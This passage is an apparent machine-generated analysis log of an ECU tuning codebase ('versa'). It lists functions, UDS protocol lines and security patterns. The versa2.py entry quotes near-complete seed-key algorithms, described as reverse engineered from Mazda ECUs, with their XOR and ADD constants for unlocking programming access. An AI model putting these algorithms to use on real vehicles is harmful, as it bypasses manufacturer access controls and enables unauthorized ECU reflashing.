0xF186)"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'send_request') as mock_send:"}, {"type": "hardware", "line": 123, "hardware": "ECU", "content": "mock_send.return_value = ECUResponse(True, vin_response, 1234567890.0)"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "vin = self.ecu_comm.read_vin()"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'send_request') as mock_send:"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "mock_send.return_value = ECUResponse(True, dtc_response, 1234567890.0)"}, {"type": "hardware", "line": 143, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 144, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "dtcs = self.ecu_comm.read_dtcs()"}, {"type": "hardware", "line": 156, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'send_request') as mock_send:"}, {"type": "hardware", "line": 157, "hardware": "ECU", "content": "mock_send.return_value = ECUResponse(True, bytes([0x54]), 1234567890.0)"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 163, "hardware": "ECU", "content": "result = self.ecu_comm.clear_dtcs()"}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'send_request') as mock_send:"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "mock_send.return_value = ECUResponse(True, rpm_response, 1234567890.0)"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 178, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 180, "hardware": "ECU", "content": "rpm = self.ecu_comm.read_live_data(0x0C)  # RPM PID"}, {"type": "hardware", "line": 188, "hardware": "ECU", "content": "dtc_code = self.ecu_comm._parse_dtc_code(dtc_bytes)"}, {"type": "hardware", "line": 193, "hardware": "ECU", "content": "dtc_code = self.ecu_comm._parse_dtc_code(dtc_bytes)"}, {"type": "hardware", "line": 197, "hardware": "ECU", "content": "dtc_code = self.ecu_comm._parse_dtc_code(bytes([0x03]))"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 204, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 207, "hardware": "ECU", "content": "self.ecu_comm._stop_listener = True"}, {"type": "hardware", "line": 209, "hardware": "ECU", "content": "self.ecu_comm._message_listener()"}, {"type": "hardware", "line": 211, "hardware": "ECU", "content": "class TestSecurityAccess(unittest.TestCase):"}, {"type": "hardware", "line": 212, "hardware": "ECU", "content": "\"\"\"Test cases for security access functionality\"\"\""}, {"type": "hardware", "line": 216, "hardware": "ECU", "content": "self.ecu_comm_mock = Mock(spec=ECUCommunicator)"}, {"type": "hardware", "line": 217, "hardware": "ECU", "content": "self.security_mgr = SecurityManager(self.ecu_comm_mock)"}, {"type": "hardware", "line": 219, "hardware": "ECU", "content": "def test_security_level_1_algorithm(self):"}, {"type": "hardware", "line": 220, "hardware": "ECU", "content": "\"\"\"Test level 1 security algorithm\"\"\""}, {"type": "hardware", "line": 224, "hardware": "ECU", "content": "key = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "key_again = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "def test_unlock_ecu_success(self):"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "\"\"\"Test successful ECU unlock\"\"\""}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "key_response = ECUResponse(True, bytes([0x67, 0x02]), 1234567890.0)"}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "hardware", "line": 240, "hardware": "ECU", "content": "result = self.security_mgr._unlock_security_level(1)"}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "self.assertEqual(self.ecu_comm_mock.send_request.call_count, 2)"}, {"type": "hardware", "line": 245, "hardware": "ECU", "content": "def test_unlock_ecu_failure(self):"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "\"\"\"Test failed ECU unlock\"\"\""}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "key_response = ECUResponse(False, bytes([0x7F, 0x27, 0x35]), 1234567890.0)  # Negative response"}, {"type": "hardware", "line": 251, "hardware": "ECU", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "result = self.security_mgr._unlock_security_level(1)"}, {"type": "hardware", "line": 262, "hardware": "ECU", "content": "self.ecu_comm_mock = Mock(spec=ECUCommunicator)"}, {"type": "hardware", "line": 263, "hardware": "ECU", "content": "self.rom_ops = ROMOperations(self.ecu_comm_mock)"}], "security_logic": [{"type": "security_pattern", "line": 20, "pattern": "security_access", "content": "from src.core.security_access import SecurityManager"}, {"type": "security_pattern", "line": 219, "pattern": "algorithm", "content": "def test_security_level_1_algorithm(self):"}, {"type": "security_pattern", "line": 220, "pattern": "algorithm", "content": "\"\"\"Test level 1 security algorithm\"\"\""}, {"type": "security_pattern", "line": 221, "pattern": "seed", "content": "seed = bytes([0x12, 0x34, 0x56, 0x78])"}, {"type": "security_pattern", "line": 222, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 224, "pattern": "key", "content": "key = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 224, "pattern": "seed", "content": "key = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 224, "pattern": "algorithm", "content": "key = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 227, "pattern": "key", "content": "self.assertEqual(len(key), 4)"}, {"type": "security_pattern", "line": 229, "pattern": "key", "content": "key_again = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 229, "pattern": "seed", "content": "key_again = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 229, "pattern": "algorithm", "content": "key_again = self.security_mgr._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 230, "pattern": "key", "content": "self.assertEqual(key, key_again)"}, {"type": "security_pattern", "line": 235, "pattern": "seed", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "security_pattern", "line": 236, "pattern": "key", "content": "key_response = ECUResponse(True, bytes([0x67, 0x02]), 1234567890.0)"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "security_pattern", "line": 238, "pattern": "seed", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "security_pattern", "line": 248, "pattern": "seed", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "security_pattern", "line": 249, "pattern": "key", "content": "key_response = ECUResponse(False, bytes([0x7F, 0x27, 0x35]), 1234567890.0)  # Negative response"}, {"type": "security_pattern", "line": 251, "pattern": "key", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "security_pattern", "line": 251, "pattern": "seed", "content": "self.ecu_comm_mock.send_request.side_effect = [seed_response, key_response]"}, {"type": "security_pattern", "line": 279, "pattern": "algorithm", "content": "\"\"\"Test checksum calculation algorithms\"\"\""}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa19.py", "lines_read": 239, "features_found": [{"type": "function", "name": "setUp", "line": 23}, {"type": "function", "name": "test_map_definitions_loaded", "line": 27}, {"type": "function", "name": "test_get_maps_by_category", "line": 44}, {"type": "function", "name": "test_validate_map_value", "line": 55}, {"type": "function", "name": "setUp", "line": 72}, {"type": "function", "name": "_create_sample_rom_data", "line": 80}, {"type": "function", "name": "test_load_map_from_rom", "line": 102}, {"type": "function", "name": "test_modify_map_value", "line": 113}, {"type": "function", "name": "test_modify_map_value_validation", "line": 125}, {"type": "function", "name": "test_apply_global_adjustment", "line": 136}, {"type": "function", "name": "test_generate_patch_rom", "line": 153}, {"type": "function", "name": "test_create_performance_tune", "line": 169}, {"type": "function", "name": "setUp", "line": 192}, {"type": "function", "name": "test_16x16_conversion", "line": 197}, {"type": "function", "name": "test_1d_conversion", "line": 217}, {"type": "import", "module": "src.tuning.map_definitions", "line": null}, {"type": "import", "module": "src.tuning.map_editor", "line": null}, {"type": "import", "module": "src.core.rom_operations", "line": null}, {"type": "import", "module": "unittest.mock", "line": null}, {"type": "import", "module": "unittest", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "MapDefinitionManager,", "line": null}, {"type": "import", "module": "MapEditor,", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}, {"type": "import", "module": "Mock,", "line": null}], "components_found": [{"type": "class", "name": "TestMapDefinitions", "line": 20}, {"type": "class", "name": "TestMapEditor", "line": 69}, {"type": "class", "name": "TestMapDataConversion", "line": 189}], "algorithms": [], "protocols": [{"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(ignition_map.address, 0x012000)"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data = bytearray(0x200000)"}, {"type": "protocol", "line": 91, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x012000:0x012000+len(ignition_data)] = ignition_data"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x014000:0x014000+len(boost_data)] = boost_data"}, {"type": "protocol", "line": 204, "protocol": "0x[0-9A-Fa-f]+", "content": "name='test_map', address=0x1000, size=512, type='2D_16x16',"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "name='test_1d_map', address=0x2000, size=16, type='1D',"}], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa2.py", "lines_read": 254, "features_found": [{"type": "function", "name": "__init__", "line": 30}, {"type": "function", "name": "unlock_ecu", "line": 62}, {"type": "function", "name": "_unlock_security_level", "line": 90}, {"type": "function", "name": "_calculate_security_key", "line": 129}, {"type": "function", "name": "_level1_algorithm", "line": 152}, {"type": "function", "name": "_level2_algorithm", "line": 162}, {"type": "function", "name": "_level3_algorithm", "line": 172}, {"type": "function", "name": "enter_programming_mode", "line": 183}, {"type": "function", "name": "exit_programming_mode", "line": 204}, {"type": "function", "name": "check_security_status", "line": 221}, {"type": "function", "name": "_get_level_description", "line": 245}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".ecu_communication", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "SecurityManager", "line": 16}], "algorithms": [{"type": "algorithm_function", "line": 129, "content": "def _calculate_security_key(self, seed: bytes, level: int) -> bytes:"}, {"type": "algorithm_function", "line": 152, "content": "def _level1_algorithm(self, seed: int) -> bytes:"}, {"type": "algorithm_function", "line": 162, "content": "def _level2_algorithm(self, seed: int) -> bytes:"}, {"type": "algorithm_function", "line": 172, "content": "def _level3_algorithm(self, seed: int) -> bytes:"}], "protocols": [{"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "'DEFAULT': 0x01,      # Basic diagnostic access"}, {"type": "protocol", "line": 25, "protocol": "0x[0-9A-Fa-f]+", "content": "'EXTENDED': 0x03,     # Extended diagnostics"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "'PROGRAMMING': 0x05,  # ECU programming access"}, {"type": "protocol", "line": 27, "protocol": "0x[0-9A-Fa-f]+", "content": "'MANUFACTURER': 0x07  # Manufacturer level"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "'XOR_KEY': 0x7382A91F,"}, {"type": "protocol", "line": 46, "protocol": "0x[0-9A-Fa-f]+", "content": "'ADD_VALUE': 0x1F47A2B8,"}, {"type": "protocol", "line": 50, "protocol": "0x[0-9A-Fa-f]+", "content": "'XOR_KEY': 0xA5C7E93D,"}, {"type": "protocol", "line": 51, "protocol": "0x[0-9A-Fa-f]+", "content": "'ADD_VALUE': 0x2B8E47F1,"}, {"type": "protocol", "line": 55, "protocol": "0x[0-9A-Fa-f]+", "content": "'XOR_KEY': 0x1F4A7C3E,"}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "'ADD_CONST': 0x8D3A2F47,"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'XOR_CONST': 0xB5E8C91A,"}, {"type": "protocol", "line": 75, "protocol": "0x[0-9A-Fa-f]+", "content": "for level in [0x01, 0x03, 0x05]:"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_response = self.ecu.send_request(0x27, level)"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response = self.ecu.send_request(0x27, level + 1, key)"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response.data[1] == 0x67):  # Positive response"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "if level == 0x01:"}, {"type": "protocol", "line": 144, "protocol": "0x[0-9A-Fa-f]+", "content": "elif level == 0x03:"}, {"type": "protocol", "line": 146, "protocol": "0x[0-9A-Fa-f]+", "content": "elif level == 0x05:"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + constants['ADD_VALUE']) & 0xFFFFFFFF"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key >> constants['ROTATE_BITS']) | (key << (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "protocol", "line": 167, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key << constants['ROTATE_BITS']) | (key >> (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "protocol", "line": 168, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + constants['ADD_VALUE']) & 0xFFFFFFFF"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "key = (key + constants['ADD_CONST']) & 0xFFFFFFFF"}, {"type": "protocol", "line": 179, "protocol": "0x[0-9A-Fa-f]+", "content": "key = ((key << constants['ROTATE_BITS']) | (key >> (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "protocol", "line": 195, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x10, 0x02)  # ProgrammingSession"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.success and len(response.data) >= 2 and response.data[1] == 0x50:"}, {"type": "protocol", "line": 211, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x10, 0x01)  # DefaultSession"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "counter_response = self.ecu.send_request(0x22, 0x0202)"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "0x00: 'No Access',"}, {"type": "protocol", "line": 249, "protocol": "0x[0-9A-Fa-f]+", "content": "0x01: 'Default Session',"}, {"type": "protocol", "line": 250, "protocol": "0x[0-9A-Fa-f]+", "content": "0x03: 'Extended Diagnostics',"}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "0x05: 'Programming Access',"}, {"type": "protocol", "line": 252, "protocol": "0x[0-9A-Fa-f]+", "content": "0x07: 'Manufacturer Level'"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 6, "hardware": "ECU", "content": "Security Access Module - Handles ECU security access and authentication"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "Reverse engineered from Mazda security algorithms used in VersaTuner"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "from .ecu_communication import ECUCommunicator, ECUResponse"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "class SecurityManager:"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "Manages ECU security access using reverse engineered algorithms"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "'PROGRAMMING': 0x05,  # ECU programming access"}, {"type": "hardware", "line": 30, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "Initialize Security Manager"}, {"type": "hardware", "line": 35, "hardware": "ECU", "content": "ecu_communicator: ECUCommunicator instance for communication"}, {"type": "hardware", "line": 37, "hardware": "ECU", "content": "self.ecu = ecu_communicator"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.security_unlocked = False"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "def unlock_ecu(self, target_level: int = ACCESS_LEVELS['PROGRAMMING']) -> bool:"}, {"type": "hardware", "line": 64, "hardware": "ECU", "content": "Unlock ECU security access for programming"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "target_level: Desired security access level"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "bool: True if security access granted, False otherwise"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "self.logger.info(f\"Attempting security unlock to level {target_level:02X}\")"}, {"type": "hardware", "line": 79, "hardware": "ECU", "content": "if not self._unlock_security_level(level):"}, {"type": "hardware", "line": 80, "hardware": "ECU", "content": "self.logger.error(f\"Failed to unlock security level {level:02X}\")"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "self.logger.info(f\"Security level {level:02X} unlocked\")"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "self.security_unlocked = True"}, {"type": "hardware", "line": 87, "hardware": "ECU", "content": "self.logger.info(\"ECU security fully unlocked\")"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "def _unlock_security_level(self, level: int) -> bool:"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "Unlock specific security level using seed-key algorithm"}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "level: Security level to unlock"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "seed_response = self.ecu.send_request(0x27, level)"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "key_response = self.ecu.send_request(0x27, level + 1, key)"}, {"type": "hardware", "line": 129, "hardware": "ECU", "content": "def _calculate_security_key(self, seed: bytes, level: int) -> bytes:"}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "Calculate security key from seed using reverse engineered algorithms"}, {"type": "hardware", "line": 134, "hardware": "ECU", "content": "seed: 4-byte seed from ECU"}, {"type": "hardware", "line": 135, "hardware": "ECU", "content": "level: Security level"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "\"\"\"Level 1 security algorithm - basic diagnostic access\"\"\""}, {"type": "hardware", "line": 163, "hardware": "ECU", "content": "\"\"\"Level 2 security algorithm - extended diagnostics\"\"\""}, {"type": "hardware", "line": 173, "hardware": "ECU", "content": "\"\"\"Level 3 security algorithm - programming access\"\"\""}, {"type": "hardware", "line": 185, "hardware": "ECU", "content": "Enter ECU programming mode for ROM flashing"}, {"type": "hardware", "line": 190, "hardware": "ECU", "content": "if not self.security_unlocked:"}, {"type": "hardware", "line": 191, "hardware": "ECU", "content": "self.logger.error(\"Security not unlocked - cannot enter programming mode\")"}, {"type": "hardware", "line": 195, "hardware": "ECU", "content": "response = self.ecu.send_request(0x10, 0x02)  # ProgrammingSession"}, {"type": "hardware", "line": 206, "hardware": "ECU", "content": "Exit ECU programming mode"}, {"type": "hardware", "line": 211, "hardware": "ECU", "content": "response = self.ecu.send_request(0x10, 0x01)  # DefaultSession"}, {"type": "hardware", "line": 215, "hardware": "ECU", "content": "self.security_unlocked = False"}, {"type": "hardware", "line": 221, "hardware": "ECU", "content": "def check_security_status(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "Check current security status of ECU"}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "Dict containing security status information"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "'unlocked': self.security_unlocked,"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "counter_response = self.ecu.send_request(0x22, 0x0202)"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "\"\"\"Get description for security level\"\"\""}], "security_logic": [{"type": "security_pattern", "line": 7, "pattern": "algorithm", "content": "Reverse engineered from Mazda security algorithms used in VersaTuner"}, {"type": "security_pattern", "line": 10, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 18, "pattern": "algorithm", "content": "Manages ECU security access using reverse engineered algorithms"}, {"type": "security_pattern", "line": 43, "pattern": "algorithm", "content": "self.ALGORITHM_CONSTANTS = {"}, {"type": "security_pattern", "line": 45, "pattern": "key", "content": "'XOR_KEY': 0x7382A91F,"}, {"type": "security_pattern", "line": 50, "pattern": "key", "content": "'XOR_KEY': 0xA5C7E93D,"}, {"type": "security_pattern", "line": 55, "pattern": "key", "content": "'XOR_KEY': 0x1F4A7C3E,"}, {"type": "security_pattern", "line": 92, "pattern": "key", "content": "Unlock specific security level using seed-key algorithm"}, {"type": "security_pattern", "line": 92, "pattern": "seed", "content": "Unlock specific security level using seed-key algorithm"}, {"type": "security_pattern", "line": 92, "pattern": "algorithm", "content": "Unlock specific security level using seed-key algorithm"}, {"type": "security_pattern", "line": 101, "pattern": "seed", "content": "seed_response = self.ecu.send_request(0x27, level)"}, {"type": "security_pattern", "line": 103, "pattern": "seed", "content": "if not seed_response.success:"}, {"type": "security_pattern", "line": 104, "pattern": "seed", "content": "self.logger.error(f\"Failed to request seed for level {level:02X}\")"}, {"type": "security_pattern", "line": 108, "pattern": "seed", "content": "if len(seed_response.data) < 6:"}, {"type": "security_pattern", "line": 109, "pattern": "seed", "content": "self.logger.error(\"Invalid seed response length\")"}, {"type": "security_pattern", "line": 112, "pattern": "seed", "content": "seed = seed_response.data[2:6]"}, {"type": "security_pattern", "line": 113, "pattern": "seed", "content": "self.logger.debug(f\"Received seed: {seed.hex().upper()}\")"}, {"type": "security_pattern", "line": 116, "pattern": "key", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "security_pattern", "line": 116, "pattern": "seed", "content": "key = self._calculate_security_key(seed, level)"}, {"type": "security_pattern", "line": 117, "pattern": "key", "content": "self.logger.debug(f\"Calculated key: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 120, "pattern": "key", "content": "key_response = self.ecu.send_request(0x27, level + 1, key)"}, {"type": "security_pattern", "line": 122, "pattern": "key", "content": "if (key_response.success and len(key_response.data) >= 2 and"}, {"type": "security_pattern", "line": 123, "pattern": "key", "content": "key_response.data[1] == 0x67):  # Positive response"}, {"type": "security_pattern", "line": 126, "pattern": "key", "content": "self.logger.error(f\"Key rejection for level {level:02X}\")"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "def _calculate_security_key(self, seed: bytes, level: int) -> bytes:"}, {"type": "security_pattern", "line": 129, "pattern": "seed", "content": "def _calculate_security_key(self, seed: bytes, level: int) -> bytes:"}, {"type": "security_pattern", "line": 131, "pattern": "key", "content": "Calculate security key from seed using reverse engineered algorithms"}, {"type": "security_pattern", "line": 131, "pattern": "seed", "content": "Calculate security key from seed using reverse engineered algorithms"}, {"type": "security_pattern", "line": 131, "pattern": "algorithm", "content": "Calculate security key from seed using reverse engineered algorithms"}, {"type": "security_pattern", "line": 134, "pattern": "seed", "content": "seed: 4-byte seed from ECU"}, {"type": "security_pattern", "line": 138, "pattern": "key", "content": "bytes: 4-byte calculated key"}, {"type": "security_pattern", "line": 140, "pattern": "seed", "content": "seed_int = int.from_bytes(seed, 'big')"}, {"type": "security_pattern", "line": 143, "pattern": "seed", "content": "return self._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 143, "pattern": "algorithm", "content": "return self._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 145, "pattern": "seed", "content": "return self._level2_algorithm(seed_int)"}, {"type": "security_pattern", "line": 145, "pattern": "algorithm", "content": "return self._level2_algorithm(seed_int)"}, {"type": "security_pattern", "line": 147, "pattern": "seed", "content": "return self._level3_algorithm(seed_int)"}, {"type": "security_pattern", "line": 147, "pattern": "algorithm", "content": "return self._level3_algorithm(seed_int)"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "return self._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 150, "pattern": "algorithm", "content": "return self._level1_algorithm(seed_int)"}, {"type": "security_pattern", "line": 152, "pattern": "seed", "content": "def _level1_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 152, "pattern": "algorithm", "content": "def _level1_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 153, "pattern": "algorithm", "content": "\"\"\"Level 1 security algorithm - basic diagnostic access\"\"\""}, {"type": "security_pattern", "line": 154, "pattern": "algorithm", "content": "constants = self.ALGORITHM_CONSTANTS['LEVEL_1']"}, {"type": "security_pattern", "line": 156, "pattern": "key", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 156, "pattern": "seed", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 157, "pattern": "key", "content": "key = (key + constants['ADD_VALUE']) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 158, "pattern": "key", "content": "key = ((key >> constants['ROTATE_BITS']) | (key << (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "return key.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 162, "pattern": "seed", "content": "def _level2_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 162, "pattern": "algorithm", "content": "def _level2_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 163, "pattern": "algorithm", "content": "\"\"\"Level 2 security algorithm - extended diagnostics\"\"\""}, {"type": "security_pattern", "line": 164, "pattern": "algorithm", "content": "constants = self.ALGORITHM_CONSTANTS['LEVEL_2']"}, {"type": "security_pattern", "line": 166, "pattern": "key", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 166, "pattern": "seed", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 167, "pattern": "key", "content": "key = ((key << constants['ROTATE_BITS']) | (key >> (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 168, "pattern": "key", "content": "key = (key + constants['ADD_VALUE']) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 170, "pattern": "key", "content": "return key.to_bytes(4, 'big')"}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "def _level3_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 172, "pattern": "algorithm", "content": "def _level3_algorithm(self, seed: int) -> bytes:"}, {"type": "security_pattern", "line": 173, "pattern": "algorithm", "content": "\"\"\"Level 3 security algorithm - programming access\"\"\""}, {"type": "security_pattern", "line": 174, "pattern": "algorithm", "content": "constants = self.ALGORITHM_CONSTANTS['LEVEL_3']"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "key = seed ^ constants['XOR_KEY']"}, {"type": "security_pattern", "line": 177, "pattern": "key", "content": "key = (key + constants['ADD_CONST']) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 178, "pattern": "key", "content": "key = key ^ constants['XOR_CONST']"}, {"type": "security_pattern", "line": 179, "pattern": "key", "content": "key = ((key << constants['ROTATE_BITS']) | (key >> (32 - constants['ROTATE_BITS']))) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 181, "pattern": "key", "content": "return key.to_bytes(4, 'big')"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
